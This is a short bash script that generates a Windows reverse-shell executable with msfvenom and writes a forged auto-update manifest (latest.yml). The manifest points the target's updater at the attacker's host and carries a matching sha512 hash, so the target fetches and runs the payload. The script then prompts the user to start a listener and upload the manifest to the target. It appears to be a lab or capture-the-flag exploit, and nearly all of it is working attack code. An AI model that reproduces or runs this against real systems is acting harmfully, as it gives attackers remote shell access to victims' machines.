#!/bin/bash

read -e -p "LHOST=" LHOST
read -e -p "LPORT=" LPORT
read -e -p "Choose name=" PAYLOAD

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD

cat - <<EOF > latest.yml
version: 2.0.9
path: http://${LHOST}/${PAYLOAD}
sha512: $(sha512sum "${PAYLOAD}" | cut -d' ' -f1 | xxd -p -r | base64 -w0)
releaseDate: '$(date --utc +%FT%T.%3NZ)'
EOF
echo ""
""
echo "Run your lisner on the port $LPORT  you specified"
echo ""
""
echo "Upload latest.yml to the target and wait"
